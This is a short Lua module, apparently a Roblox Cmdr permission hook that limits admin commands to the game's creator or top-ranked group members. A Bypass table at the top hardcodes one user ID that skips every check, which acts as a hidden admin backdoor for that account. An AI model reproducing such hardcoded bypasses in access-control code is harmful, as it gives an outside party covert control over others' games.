
local Bypass = {
	[1041213550] = true -- SPOOK_EXE
}

return function(registry)
	registry:RegisterHook('BeforeRun', function(context)
		
		if context.Executer and context.Executer.UserId and Bypass[context.Executer.UserId] then
			return true
		end
		
		if context.Group == 'DefaultAdmin' then
			if game.CreatorType == Enum.CreatorType.Group then
				local LocalPlayer = game:GetService('Players'):GetPlayerByUserId(context.Executer.UserId)
				if not LocalPlayer:IsInGroup(game.CreatorId) or LocalPlayer:GetRankInGroup(game.CreatorId) ~= 255 then
					return 'You do not have permissions to run this command.'
				end
			elseif game.CreatorId ~= context.Executer.UserId then
				return 'You do not have permissions to run this command.'
			end
		end
		
	end)
end